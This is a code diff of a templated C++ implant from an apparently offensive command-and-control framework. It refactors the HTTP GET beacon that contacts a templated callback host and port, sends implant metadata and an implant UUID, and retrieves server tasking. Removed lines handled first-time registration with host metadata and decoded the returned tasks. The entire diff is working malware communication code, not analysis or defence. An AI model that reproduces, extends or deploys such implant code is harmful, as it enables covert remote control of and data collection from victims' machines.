@@ -34,30 +34,8 @@ Required Keys:
 using namespace std::string_literals;
 #include "core/settings.h"
 
-nlohmann::json [[ http_get_function_name ]](std::string implant_uuid) {
-    // Note: pass a copy of implant_uuid in, as we are going to be potentially heavily editing it. 
+std::vector <uint8_t> [[ http_get_function_name ]](std::vector<uint8_t> metadata_as_msgpack) {
     std::string http_response_buffer;
-
-    int registered = SettingsManager::instance().get<int>("registered",0);
-    std::vector<uint8_t> metadata_as_msgpack;
-
-    //if not registered, send our init metdata back. 
-    if (registered == 0) {
-        std::cout << "NOT REG< METADATA SEND" << std::endl;
-        //only send metadata on init
-
-        //returns a nholmann::json
-        nlohmann::json _metadata = populate_metadata();
-        _metadata["implant_uuid"] = implant_uuid;
-        metadata_as_msgpack = nlohmann::json::to_msgpack(_metadata);
-    }
-
-    //if already registered, just send back implant_uuid in metdata
-    else {
-        nlohmann::json _metadata;
-        _metadata["implant_uuid"] = implant_uuid;
-        metadata_as_msgpack = nlohmann::json::to_msgpack(_metadata);
-    }
 
     // Hold bytes in a string container, as all the transforms want a string
     // do NOT change the `metadata` var name prior to templating, it's needed for it
@@ -132,7 +110,8 @@ nlohmann::json [[ http_get_function_name ]](std::string implant_uuid) {
     if (HTTP_GET(L"[[callback_host]]", [[callback_port]], L"[[http_get_verb]]", uri, headers, request_body, http_response_buffer)) {
 
         if (http_response_buffer.empty()){
-            return nullptr;
+            //blank buffer
+            return std::vector<uint8_t> {};
         }
 
         // --- Reverse Transforms for Server output ---
@@ -142,29 +121,10 @@ nlohmann::json [[ http_get_function_name ]](std::string implant_uuid) {
         [%- endfor %]
 
         // --- End Reverse Transforms for Server output ---
-
-        try {
-            nlohmann::json result = nlohmann::json::from_msgpack(http_response_buffer);
-            return result;
-        }
-        catch (nlohmann::json::parse_error& e) {
-            std::cerr << "JSON Parse Error: " << e.what() << std::endl;
-            std::cerr << "Byte position of error: " << e.byte << std::endl;
-            
-            // PRINT THE RAW HEX to see what you actually received
-            std::cerr << "Raw Buffer (Hex): ";
-            for (auto byte : http_response_buffer) {
-                printf("%02X ", (unsigned char)byte);
-            }
-            std::cout << std::endl;
-            
-            return nlohmann::json(); // Return null json to prevent crash
-        }
-
-        //return decode_msgpack_task(http_response_buffer);
+        //string -> vector
+        std::vector<uint8_t> response_buffer(http_response_buffer.begin(), http_response_buffer.end());
+        return response_buffer;
     }
-
-    return nullptr;
 }
 
 int [[ http_post_function_name ]](std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list) {
